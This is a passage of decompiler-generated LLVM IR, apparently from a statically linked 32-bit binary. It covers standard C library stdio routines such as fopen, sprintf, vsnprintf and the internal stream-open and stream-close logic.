  %v1_80511cf = add i32 %v4_80511cb, 52
  %v2_80511cf = inttoptr i32 %v1_80511cf to i32*
  %v3_80511cf = load i32, i32* %v2_80511cf, align 4
  store i32 %v3_80511cf, i32* @ebp, align 4
  %v1_80511d2 = icmp eq i32 %v3_80511cf, 0
  %v1_80511d4 = icmp eq i1 %v1_80511d2, false
  br i1 %v1_80511d4, label %dec_label_pc_80511f5, label %dec_label_pc_80511d6

dec_label_pc_80511d6:                             ; preds = %entry
  %v1_80511d6 = add i32 %v4_80511cb, 56
  store i32 %v1_80511d6, i32* @ebx, align 4
  %v2_80511e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80511e0, i32* @eax, align 4
  %v2_80511e5 = call i32 @__pthread_return_void(i32 %v2_80511e0, i32 134565087)
  %v0_80511ea = load i32, i32* @ebx, align 4
  %v1_80511ed = call i32 @__pthread_return_0(i32 %v0_80511ea)
  store i32 %v1_80511ed, i32* @eax, align 4
  %v0_80511f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80511f5

dec_label_pc_80511f5:                             ; preds = %entry, %dec_label_pc_80511d6
  %v0_80511ff = phi i32 [ %v4_80511cb, %entry ], [ %v0_80511f7.pre, %dec_label_pc_80511d6 ]
  store i32 0, i32* @edi, align 4
  %v1_80511f7 = inttoptr i32 %v0_80511ff to i8*
  %v2_80511f7 = load i8, i8* %v1_80511f7, align 1
  %v3_80511f7 = and i8 %v2_80511f7, 64
  %v4_80511f7 = icmp eq i8 %v3_80511f7, 0
  br i1 %v4_80511f7, label %dec_label_pc_80511f5.dec_label_pc_805120a_crit_edge, label %dec_label_pc_80511fc

dec_label_pc_80511f5.dec_label_pc_805120a_crit_edge: ; preds = %dec_label_pc_80511f5
  br label %dec_label_pc_805120a

dec_label_pc_80511fc:                             ; preds = %dec_label_pc_80511f5
  %v1_8051200 = inttoptr i32 %v0_80511ff to i16*
  %v2_8051200 = call i32 @fflush_unlocked(i16* %v1_8051200)
  store i32 %v2_8051200, i32* @edi, align 4
  %v0_805120d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805120a

dec_label_pc_805120a:                             ; preds = %dec_label_pc_80511f5.dec_label_pc_805120a_crit_edge, %dec_label_pc_80511fc
  %v0_805120d = phi i32 [ %v0_80511ff, %dec_label_pc_80511f5.dec_label_pc_805120a_crit_edge ], [ %v0_805120d.pre, %dec_label_pc_80511fc ]
  %v1_805120d = add i32 %v0_805120d, 4
  %v2_805120d = inttoptr i32 %v1_805120d to i32*
  %v3_805120d = load i32, i32* %v2_805120d, align 4
  %v1_8051210 = call i32 @__libc_close(i32 %v3_805120d)
  %v0_8051218 = load i32, i32* @esi, align 4
  %v1_8051218 = add i32 %v0_8051218, 4
  %v2_8051218 = inttoptr i32 %v1_8051218 to i32*
  store i32 -1, i32* %v2_8051218, align 4
  %v2_8051229 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8051229, i32* @ebx, align 4
  %v2_805122e = icmp slt i32 %v1_8051210, 0
  store i32 -1, i32* @eax, align 4
  %v1_8051235 = load i32, i32* @edi, align 4
  %v3_8051235 = select i1 %v2_805122e, i32 -1, i32 %v1_8051235
  store i32 %v3_8051235, i32* @edi, align 4
  %v2_8051238 = call i32 @__pthread_return_void(i32 %v2_8051229, i32 134565087)
  %v1_8051244 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  %v0_8051249 = load i32, i32* @global_var_805f564.465, align 4
  %v1_805124e = add i32 %v0_8051249, 1
  store i32 %v1_805124e, i32* @global_var_805f564.465, align 4
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* @eax, align 4
  %v2_8051259 = call i32 @__pthread_return_void(i32 %v2_8051229, i32 1)
  %v0_805125e = load i32, i32* @esi, align 4
  %v1_805125e = inttoptr i32 %v0_805125e to i32*
  %v2_805125e = load i32, i32* %v1_805125e, align 4
  %v1_8051263 = and i32 %v2_805125e, 24576
  %v1_8051268 = or i32 %v1_8051263, 48
  store i32 %v1_8051268, i32* @eax, align 4
  %v1_805126d = trunc i32 %v1_8051268 to i16
  %v3_805126d = inttoptr i32 %v0_805125e to i16*
  store i16 %v1_805126d, i16* %v3_805126d, align 2
  br i1 %v1_80511d4, label %dec_label_pc_8051283, label %dec_label_pc_8051272

dec_label_pc_8051272:                             ; preds = %dec_label_pc_805120a
  %v2_8051276 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051276, i32* @eax, align 4
  %v2_805127b = call i32 @__pthread_return_void(i32 %v2_8051276, i32 1)
  store i32 %v2_805127b, i32* @eax, align 4
  br label %dec_label_pc_8051283

dec_label_pc_8051283:                             ; preds = %dec_label_pc_805120a, %dec_label_pc_8051272
  %v0_8051283 = load i32, i32* @esi, align 4
  %v1_8051283 = add i32 %v0_8051283, 1
  %v2_8051283 = inttoptr i32 %v1_8051283 to i8*
  %v3_8051283 = load i8, i8* %v2_8051283, align 1
  %v4_8051283 = and i8 %v3_8051283, 64
  %v5_8051283 = icmp eq i8 %v4_8051283, 0
  br i1 %v5_8051283, label %dec_label_pc_8051297, label %dec_label_pc_8051289

dec_label_pc_8051289:                             ; preds = %dec_label_pc_8051283
  %v1_805128c = add i32 %v0_8051283, 8
  %v2_805128c = inttoptr i32 %v1_805128c to i32*
  %v3_805128c = load i32, i32* %v2_805128c, align 4
  %v1_805128f = call i32 @free(i32 %v3_805128c)
  store i32 %v1_805128f, i32* @eax, align 4
  br label %dec_label_pc_8051297

dec_label_pc_8051297:                             ; preds = %dec_label_pc_8051283, %dec_label_pc_8051289
  %v2_80512a3 = call i32 @__pthread_return_void(i32 %v2_8051229, i32 134565087)
  %v1_80512af = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* @eax, align 4
  %v0_80512b5 = load i32, i32* @global_var_805f568.466, align 8
  %v1_80512b5 = add i32 %v0_80512b5, 1
  store i32 %v1_80512b5, i32* @global_var_805f568.466, align 8
  %v2_80512bf = call i32 @__pthread_return_void(i32 %v2_8051229, i32 1)
  %v0_80512c4 = call i32 @_stdio_openlist_dec_use()
  %v0_80512cc = load i32, i32* @edi, align 4
  store i32 %v0_80511c7, i32* @ebx, align 4
  store i32 %v0_80511c6, i32* @esi, align 4
  store i32 %v0_80511c5, i32* @edi, align 4
  store i32 %v0_80511c4, i32* @ebp, align 4
  ret i32 %v0_80512cc

; uselistorder directives
  uselistorder i32 %v2_8051229, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_8051297, { 1, 0 }
  uselistorder label %dec_label_pc_8051283, { 1, 0 }
  uselistorder label %dec_label_pc_805120a, { 1, 0 }
  uselistorder label %dec_label_pc_80511f5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80512e3 = inttoptr i32 %arg2 to i8*
  %v5_80512e3 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80512e3, i32 0, i32 -1)
  ret i32 %v5_80512e3
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80512ef = ptrtoint i32* %stack_var_12 to i32
  %v4_8051302 = inttoptr i32 %arg1 to i8*
  %v5_8051302 = call i32 @__GI_vsnprintf(i8* %v4_8051302, i32 -1, i32 %arg2, i32 %v2_80512ef)
  ret i32 %v5_8051302
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805130c = load i32, i32* @ebp, align 4
  %v0_805130d = load i32, i32* @edi, align 4
  %v0_805130e = load i32, i32* @esi, align 4
  %v0_805130f = load i32, i32* @ebx, align 4
  store i32 %v0_805130f, i32* %stack_var_-16, align 4
  %v4_8051313 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051313, i32* @esi, align 4
  %v2_8051317 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_8051322 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_8051322, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_805133c = sub i32 -1, %v4_8051313
  %v1_805134f = call i32 @__stdio_init_mutex(i32 %v2_8051317)
  %v1_805135f = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_805133c, %v1_805135f
  %v5_8051361 = select i1 %tmp, i32 %v1_805133c, i32 %v1_805135f
  store i32 %v5_8051361, i32* @ebx, align 4
  %v0_8051364 = load i32, i32* @esi, align 4
  %v3_805138e = inttoptr i32 %arg3 to i8*
  %v4_805138e = call i32 @_vfprintf_internal(i32 %v2_8051322, i8* %v3_805138e, i32 %arg4)
  %v1_8051396 = icmp eq i32 %v5_8051361, 0
  store i32 %v4_805138e, i32* @edx, align 4
  br i1 %v1_8051396, label %dec_label_pc_80513b2, label %dec_label_pc_80513ab

dec_label_pc_80513ab:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_8051364 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_80513b5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80513b2

dec_label_pc_80513b2:                             ; preds = %entry, %dec_label_pc_80513ab
  %v0_80513b5 = phi i32 [ %v4_805138e, %entry ], [ %v0_80513b5.pre, %dec_label_pc_80513ab ]
  %v2_80513b7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80513b7, i32* @ebx, align 4
  store i32 %v0_805130e, i32* @esi, align 4
  store i32 %v0_805130d, i32* @edi, align 4
  store i32 %v0_805130c, i32* @ebp, align 4
  ret i32 %v0_80513b5

; uselistorder directives
  uselistorder i32 %v1_805135f, { 1, 0 }
  uselistorder i32 %v1_805133c, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_80513b2, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80513bc = load i32, i32* @ebp, align 4
  %v0_80513bd = load i32, i32* @edi, align 4
  %v0_80513be = load i32, i32* @esi, align 4
  %v0_80513bf = load i32, i32* @ebx, align 4
  store i32 %v0_80513bf, i32* %stack_var_-16, align 4
  %v4_80513c3 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80513c3, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_80513d3 = load i8, i8* %arg2, align 1
  %v3_80513d3 = zext i8 %v2_80513d3 to i32
  %v4_80513d3 = load i32, i32* @eax, align 4
  %v5_80513d3 = and i32 %v4_80513d3, -256
  %v6_80513d3 = or i32 %v5_80513d3, %v3_80513d3
  store i32 %v6_80513d3, i32* %eax.global-to-local, align 4
  %v10_80513d5 = icmp eq i8 %v2_80513d3, 114
  br i1 %v10_80513d5, label %dec_label_pc_8051417, label %dec_label_pc_80513d9

dec_label_pc_80513d9:                             ; preds = %entry
  %v10_80513d9 = icmp eq i8 %v2_80513d3, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_80513d9, label %dec_label_pc_8051419, label %dec_label_pc_80513e2

dec_label_pc_80513e2:                             ; preds = %dec_label_pc_80513d9
  %v10_80513e2 = icmp eq i8 %v2_80513d3, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_80513e2, label %dec_label_pc_8051419, label %dec_label_pc_80513ea

dec_label_pc_80513ea:                             ; preds = %dec_label_pc_8051492, %dec_label_pc_805146c, %dec_label_pc_80513e2
  %v0_80513ea = load i32, i32* %stack_var_-16, align 4
  %v1_80513ea = call i32 @__errno_location(i32 %v0_80513ea)
  store i32 %v1_80513ea, i32* %eax.global-to-local, align 4
  %v0_80513ef = load i32, i32* @ebp, align 4
  %v1_80513ef = icmp eq i32 %v0_80513ef, 0
  %v1_80513f1 = inttoptr i32 %v1_80513ea to i32*
  store i32 22, i32* %v1_80513f1, align 4
  br i1 %v1_80513ef, label %dec_label_pc_80515f3, label %dec_label_pc_80513fd

dec_label_pc_80513fd:                             ; preds = %dec_label_pc_80514b5, %dec_label_pc_80513ea
  %v0_80513fd = load i32, i32* @ebp, align 4
  %v1_80513fd = add i32 %v0_80513fd, 1
  %v2_80513fd = inttoptr i32 %v1_80513fd to i8*
  %v3_80513fd = load i8, i8* %v2_80513fd, align 1
  %v4_80513fd = and i8 %v3_80513fd, 32
  %v5_80513fd = icmp eq i8 %v4_80513fd, 0
  br i1 %v5_80513fd, label %dec_label_pc_80515f3, label %dec_label_pc_8051407

dec_label_pc_8051407:                             ; preds = %dec_label_pc_80513fd
  store i32 %v0_80513fd, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805140d = call i32 @free(i32 %v0_80513fd)
  br label %dec_label_pc_80515ee

dec_label_pc_8051417:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051419

dec_label_pc_8051419:                             ; preds = %dec_label_pc_80513e2, %dec_label_pc_80513d9, %dec_label_pc_8051417
  %v0_805142a = phi i32 [ 1089, %dec_label_pc_80513e2 ], [ 577, %dec_label_pc_80513d9 ], [ 0, %dec_label_pc_8051417 ]
  %v1_8051419 = add i32 %v4_80513c3, 1
  %v2_8051419 = inttoptr i32 %v1_8051419 to i8*
  %v3_8051419 = load i8, i8* %v2_8051419, align 1
  %v12_8051419 = icmp eq i8 %v3_8051419, 98
  %v1_8051419.v4_80513c3 = select i1 %v12_8051419, i32 %v1_8051419, i32 %v4_80513c3
  store i32 %v1_8051419.v4_80513c3, i32* %eax.global-to-local, align 4
  %v1_8051424 = add i32 %v1_8051419.v4_80513c3, 1
  %v2_8051424 = inttoptr i32 %v1_8051424 to i8*
  %v3_8051424 = load i8, i8* %v2_8051424, align 1
  %v12_8051424 = icmp eq i8 %v3_8051424, 43
  %v1_8051428 = icmp eq i1 %v12_8051424, false
  br i1 %v1_8051428, label %dec_label_pc_8051432, label %dec_label_pc_805142a

dec_label_pc_805142a:                             ; preds = %dec_label_pc_8051419
  %v1_805142c = or i32 %v0_805142a, 1
  store i32 %v1_805142c, i32* %eax.global-to-local, align 4
  %v1_805142f = add nuw nsw i32 %v1_805142c, 1
  store i32 %v1_805142f, i32* @ebx, align 4
  br label %dec_label_pc_8051432

dec_label_pc_8051432:                             ; preds = %dec_label_pc_8051419, %dec_label_pc_805142a
  %v0_80514b57 = phi i32 [ %v0_805142a, %dec_label_pc_8051419 ], [ %v1_805142f, %dec_label_pc_805142a ]
  %v1_8051432 = icmp eq i32 %arg3, 0
  %v1_8051434 = icmp eq i1 %v1_8051432, false
  br i1 %v1_8051434, label %dec_label_pc_8051468, label %dec_label_pc_8051436

dec_label_pc_8051436:                             ; preds = %dec_label_pc_8051432
  store i32 80, i32* %stack_var_-76, align 4
  %v1_805143b = call i32 @malloc(i32 80)
  store i32 %v1_805143b, i32* %eax.global-to-local, align 4
  %v2_8051443 = icmp eq i32 %v1_805143b, 0
  store i32 %v1_805143b, i32* @ebp, align 4
  br i1 %v2_8051443, label %dec_label_pc_80515f5, label %dec_label_pc_805144d

dec_label_pc_805144d:                             ; preds = %dec_label_pc_8051436
  %v2_805143b = inttoptr i32 %v1_805143b to i16*
  store i16 8192, i16* %v2_805143b, align 2
  %v2_8051455 = add i32 %v1_805143b, 8
  %v3_8051455 = inttoptr i32 %v2_8051455 to i32*
  store i32 0, i32* %v3_8051455, align 4
  %v2_805145c = add i32 %v1_805143b, 56
  store i32 %v2_805145c, i32* %eax.global-to-local, align 4
  store i32 %v2_805145c, i32* %stack_var_-76, align 4
  %v1_8051460 = call i32 @__stdio_init_mutex(i32 %v2_805145c)
  store i32 %v1_8051460, i32* %eax.global-to-local, align 4
  %v0_80514b5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051468

dec_label_pc_8051468:                             ; preds = %dec_label_pc_8051432, %dec_label_pc_805144d
  %v2_80514bb = phi i32 [ %v0_80514b57, %dec_label_pc_8051432 ], [ %v0_80514b5.pre, %dec_label_pc_805144d ]
  %v2_8051468 = icmp slt i32 %arg4, 0
  br i1 %v2_8051468, label %dec_label_pc_80514b5, label %dec_label_pc_805146c

dec_label_pc_805146c:                             ; preds = %dec_label_pc_8051468
  %v1_805146e = and i32 %v2_80514bb, 32771
  %v1_8051474 = add nuw nsw i32 %v1_805146e, 1
  store i32 %v1_8051474, i32* @edx, align 4
  %v0_8051475 = load i32, i32* @esi, align 4
  %v1_8051475 = add i32 %v0_8051475, 1
  %v2_8051478 = and i32 %v1_8051475, %v1_8051474
  store i32 %v2_8051478, i32* %eax.global-to-local, align 4
  %v12_805147a = icmp eq i32 %v2_8051478, %v1_8051474
  %v1_805147c = load i32, i32* @ebp, align 4
  %v2_805147c = add i32 %v1_805147c, 4
  %v3_805147c = inttoptr i32 %v2_805147c to i32*
  store i32 %arg4, i32* %v3_805147c, align 4
  %v1_805147f = icmp eq i1 %v12_805147a, false
  br i1 %v1_805147f, label %dec_label_pc_80513ea, label %dec_label_pc_8051485

dec_label_pc_8051485:                             ; preds = %dec_label_pc_805146c
  %v0_8051485 = load i32, i32* @esi, align 4
  %v1_8051487 = and i32 %v0_8051485, 1024
  %v1_8051489 = xor i32 %v1_8051487, 1024
  store i32 %v1_8051489, i32* %eax.global-to-local, align 4
  %v1_805148e = load i32, i32* @ebx, align 4
  %v2_805148e = and i32 %v1_805148e, %v1_8051489
  %v3_805148e = icmp eq i32 %v2_805148e, 0
  br i1 %v3_805148e, label %dec_label_pc_8051485.dec_label_pc_80514ab_crit_edge, label %dec_label_pc_8051492

dec_label_pc_8051485.dec_label_pc_80514ab_crit_edge: ; preds = %dec_label_pc_8051485
  br label %dec_label_pc_80514ab

dec_label_pc_8051492:                             ; preds = %dec_label_pc_8051485
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805149b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805149b, i32* %eax.global-to-local, align 4
  %v1_80514a3 = icmp eq i32 %v3_805149b, 0
  %v1_80514a5 = icmp eq i1 %v1_80514a3, false
  br i1 %v1_80514a5, label %dec_label_pc_80513ea, label %dec_label_pc_8051492.dec_label_pc_80514ab_crit_edge

dec_label_pc_8051492.dec_label_pc_80514ab_crit_edge: ; preds = %dec_label_pc_8051492
  %v0_80514ab.pre = load i32, i32* @esi, align 4
  %v0_80514b1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80514ab

dec_label_pc_80514ab:                             ; preds = %dec_label_pc_8051485.dec_label_pc_80514ab_crit_edge, %dec_label_pc_8051492.dec_label_pc_80514ab_crit_edge
  %v0_80514b1 = phi i32 [ %v1_805148e, %dec_label_pc_8051485.dec_label_pc_80514ab_crit_edge ], [ %v0_80514b1.pre, %dec_label_pc_8051492.dec_label_pc_80514ab_crit_edge ]
  %v0_80514ab = phi i32 [ %v0_8051485, %dec_label_pc_8051485.dec_label_pc_80514ab_crit_edge ], [ %v0_80514ab.pre, %dec_label_pc_8051492.dec_label_pc_80514ab_crit_edge ]
  %v1_80514ab = and i32 %v0_80514ab, 32768
  %v2_80514b1 = or i32 %v1_80514ab, %v0_80514b1
  store i32 %v2_80514b1, i32* @ebx, align 4
  br label %dec_label_pc_80514d9

dec_label_pc_80514b5:                             ; preds = %dec_label_pc_8051468
  %v11_80514b7 = or i32 %v2_80514bb, 32768
  store i32 %v11_80514b7, i32* %eax.global-to-local, align 4
  %v1_80514ba = add i32 %arg4, 1
  %v8_80514ba = icmp eq i32 %v1_80514ba, 0
  store i32 %v1_80514ba, i32* @edi, align 4
  %v1_80514bb = icmp eq i1 %v8_80514ba, false
  %v4_80514bb = select i1 %v1_80514bb, i32 %v11_80514b7, i32 %v2_80514bb
  store i32 %v4_80514bb, i32* @ebx, align 4
  %v0_80514c5 = load i32, i32* @esi, align 4
  store i32 %v0_80514c5, i32* %stack_var_-76, align 4
  %v3_80514c6 = inttoptr i32 %v0_80514c5 to i8*
  %v4_80514c6 = call i32 @__libc_open(i8* %v3_80514c6, i32 %v4_80514bb)
  store i32 %v4_80514c6, i32* %eax.global-to-local, align 4
  %v2_80514ce = icmp slt i32 %v4_80514c6, 0
  %v1_80514d0 = load i32, i32* @ebp, align 4
  %v2_80514d0 = add i32 %v1_80514d0, 4
  %v3_80514d0 = inttoptr i32 %v2_80514d0 to i32*
  store i32 %v4_80514c6, i32* %v3_80514d0, align 4
  br i1 %v2_80514ce, label %dec_label_pc_80513fd, label %dec_label_pc_80514d9

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514b5, %dec_label_pc_80514ab
  %v0_80514d9 = load i32, i32* @ebp, align 4
  %v1_80514d9 = inttoptr i32 %v0_80514d9 to i32*
  %v2_80514d9 = load i32, i32* %v1_80514d9, align 4
  %v2_80514d9.tr = trunc i32 %v2_80514d9 to i16
  %v1_80514e1 = and i16 %v2_80514d9.tr, 8192
  %v3_80514e1 = inttoptr i32 %v0_80514d9 to i16*
  store i16 %v1_80514e1, i16* %v3_80514e1, align 2
  %v0_80514e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80514e5, i32* %eax.global-to-local, align 4
  %v1_80514e7 = and i32 %v0_80514e5, -31744
  %v0_80514ed = load i32, i32* @ebp, align 4
  %v1_80514ed = inttoptr i32 %v0_80514ed to i32*
  %v2_80514ed = load i32, i32* %v1_80514ed, align 4
  %v1_80514f0 = mul i32 %v0_80514e5, 16
  %v1_80514f3 = and i32 %v1_80514f0, 48
  %v1_80514f4 = add nuw nsw i32 %v1_80514f3, 16
  %v2_80514f7 = xor i32 %v1_80514f4, 48
  %v2_80514fa = or i32 %v2_80514ed, %v1_80514e7
  %v2_80514fc = or i32 %v2_80514fa, %v2_80514f7
  store i32 %v2_80514fc, i32* %eax.global-to-local, align 4
  %v1_80514fe = trunc i32 %v2_80514fc to i16
  %v3_80514fe = inttoptr i32 %v0_80514ed to i16*
  store i16 %v1_80514fe, i16* %v3_80514fe, align 2
  %v0_8051502 = load i32, i32* %stack_var_-76, align 4
  %v1_8051502 = call i32 @__errno_location(i32 %v0_8051502)
  store i32 %v1_8051502, i32* %eax.global-to-local, align 4
  %v0_805150a = load i32, i32* @ebp, align 4
  %v1_805150a = inttoptr i32 %v0_805150a to i16*
  %v2_805150a = load i16, i16* %v1_805150a, align 2
  %v3_805150a = zext i16 %v2_805150a to i32
  store i32 %v3_805150a, i32* @ebx, align 4
  %v1_805150e = inttoptr i32 %v1_8051502 to i32*
  %v2_805150e = load i32, i32* %v1_805150e, align 4
  store i32 %v2_805150e, i32* @edi, align 4
  store i32 %v1_8051502, i32* @esi, align 4
  %v1_8051512 = add i32 %v0_805150a, 4
  %v2_8051512 = inttoptr i32 %v1_8051512 to i32*
  %v3_8051512 = load i32, i32* %v2_8051512, align 4
  store i32 %v3_8051512, i32* %stack_var_-76, align 4
  %v1_8051515 = call i32 @isatty(i32 %v3_8051512)
  %v2_805151d = mul i32 %v1_8051515, 256
  store i32 %v2_805151d, i32* %eax.global-to-local, align 4
  %v0_8051520 = load i32, i32* @ebx, align 4
  %v2_8051520 = or i32 %v0_8051520, %v2_805151d
  store i32 %v2_8051520, i32* @ebx, align 4
  %v1_8051522 = trunc i32 %v2_8051520 to i16
  %v2_8051522 = load i32, i32* @ebp, align 4
  %v3_8051522 = inttoptr i32 %v2_8051522 to i16*
  store i16 %v1_8051522, i16* %v3_8051522, align 2
  %v0_8051526 = load i32, i32* @edi, align 4
  %v1_8051526 = load i32, i32* @esi, align 4
  %v2_8051526 = inttoptr i32 %v1_8051526 to i32*
  store i32 %v0_8051526, i32* %v2_8051526, align 4
  %v0_8051528 = load i32, i32* @ebp, align 4
  %v1_8051528 = add i32 %v0_8051528, 8
  %v2_8051528 = inttoptr i32 %v1_8051528 to i32*
  %v3_8051528 = load i32, i32* %v2_8051528, align 4
  %v4_8051528 = icmp eq i32 %v3_8051528, 0
  %v1_805152c = icmp eq i1 %v4_8051528, false
  br i1 %v1_805152c, label %dec_label_pc_8051560, label %dec_label_pc_805152e

dec_label_pc_805152e:                             ; preds = %dec_label_pc_80514d9
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8051536 = call i32 @malloc(i32 4096)
  store i32 %v1_8051536, i32* %eax.global-to-local, align 4
  %v1_805153e = icmp eq i32 %v1_8051536, 0
  %v1_8051540 = load i32, i32* @ebp, align 4
  %v2_8051540 = add i32 %v1_8051540, 8
  %v3_8051540 = inttoptr i32 %v2_8051540 to i32*
  store i32 %v1_8051536, i32* %v3_8051540, align 4
  br i1 %v1_805153e, label %dec_label_pc_8051559, label %dec_label_pc_8051545

dec_label_pc_8051545:                             ; preds = %dec_label_pc_805152e
  %v1_8051545 = add i32 %v1_8051536, 4096
  store i32 %v1_8051545, i32* %eax.global-to-local, align 4
  %v1_805154a = load i32, i32* @ebp, align 4
  %v2_805154a = add i32 %v1_805154a, 12
  %v3_805154a = inttoptr i32 %v2_805154a to i32*
  store i32 %v1_8051545, i32* %v3_805154a, align 4
  %v0_805154d = load i32, i32* @ebp, align 4
  %v1_805154d = inttoptr i32 %v0_805154d to i32*
  %v2_805154d = load i32, i32* %v1_805154d, align 4
  %v1_8051550 = udiv i32 %v2_805154d, 256
  %v3_8051550 = and i32 %v1_8051550, 191
  %v8_8051550 = or i32 %v3_8051550, 64
  %v10_8051550 = mul nuw nsw i32 %v8_8051550, 256
  %v11_8051550 = and i32 %v2_805154d, -65281
  %v12_8051550 = or i32 %v10_8051550, %v11_8051550
  store i32 %v12_8051550, i32* %eax.global-to-local, align 4
  %v1_8051553 = trunc i32 %v12_8051550 to i16
  %v3_8051553 = inttoptr i32 %v0_805154d to i16*
  store i16 %v1_8051553, i16* %v3_8051553, align 2
  br label %dec_label_pc_8051560

dec_label_pc_8051559:                             ; preds = %dec_label_pc_805152e
  %v0_8051559 = load i32, i32* @ebp, align 4
  %v1_8051559 = add i32 %v0_8051559, 12
  %v2_8051559 = inttoptr i32 %v1_8051559 to i32*
  store i32 0, i32* %v2_8051559, align 4
  br label %dec_label_pc_8051560

dec_label_pc_8051560:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_8051545, %dec_label_pc_8051559
  %v0_8051560 = load i32, i32* @ebp, align 4
  %v1_8051560 = add i32 %v0_8051560, 8
  %v2_8051560 = inttoptr i32 %v1_8051560 to i32*
  %v3_8051560 = load i32, i32* %v2_8051560, align 4
  store i32 %v3_8051560, i32* %eax.global-to-local, align 4
  %v1_8051563 = add i32 %v0_8051560, 2
  %v2_8051563 = inttoptr i32 %v1_8051563 to i8*
  store i8 0, i8* %v2_8051563, align 1
  %v0_8051567 = load i32, i32* @ebp, align 4
  %v1_8051567 = add i32 %v0_8051567, 44
  %v2_8051567 = inttoptr i32 %v1_8051567 to i32*
  store i32 0, i32* %v2_8051567, align 4
  %v0_805156e = load i32, i32* @ebp, align 4
  %v1_805156e = add i32 %v0_805156e, 1
  %v2_805156e = inttoptr i32 %v1_805156e to i8*
  %v3_805156e = load i8, i8* %v2_805156e, align 1
  %v4_805156e = and i8 %v3_805156e, 32
  %v5_805156e = icmp eq i8 %v4_805156e, 0
  %v0_8051572 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051572 = add i32 %v0_805156e, 24
  %v3_8051572 = inttoptr i32 %v2_8051572 to i32*
  store i32 %v0_8051572, i32* %v3_8051572, align 4
  %v0_8051575 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051575 = load i32, i32* @ebp, align 4
  %v2_8051575 = add i32 %v1_8051575, 28
  %v3_8051575 = inttoptr i32 %v2_8051575 to i32*
  store i32 %v0_8051575, i32* %v3_8051575, align 4
  %v0_8051578 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051578 = load i32, i32* @ebp, align 4
  %v2_8051578 = add i32 %v1_8051578, 16
  %v3_8051578 = inttoptr i32 %v2_8051578 to i32*
  store i32 %v0_8051578, i32* %v3_8051578, align 4
  %v0_805157b = load i32, i32* %eax.global-to-local, align 4
  %v1_805157b = load i32, i32* @ebp, align 4
  %v2_805157b = add i32 %v1_805157b, 20
  %v3_805157b = inttoptr i32 %v2_805157b to i32*
  store i32 %v0_805157b, i32* %v3_805157b, align 4
  %v0_805157e = load i32, i32* @global_var_805b2ec.467, align 4
  store i32 %v0_805157e, i32* @eax, align 4
  %v1_8051583 = load i32, i32* @ebp, align 4
  %v2_8051583 = add i32 %v1_8051583, 52
  %v3_8051583 = inttoptr i32 %v2_8051583 to i32*
  store i32 %v0_805157e, i32* %v3_8051583, align 4
  br i1 %v5_805156e, label %dec_label_pc_80515f5, label %dec_label_pc_8051588

dec_label_pc_8051588:                             ; preds = %dec_label_pc_8051560
  %v2_8051593 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051593, i32* %stack_var_-76, align 4
  %v2_8051598 = call i32 @__pthread_return_void(i32 %v2_8051593, i32 134565087)
  store i32 %v2_8051598, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* %stack_var_-76, align 4
  %v1_80515a4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 %v1_80515a4, i32* @eax, align 4
  %v2_80515b6 = ptrtoint i32* %stack_var_-48 to i32
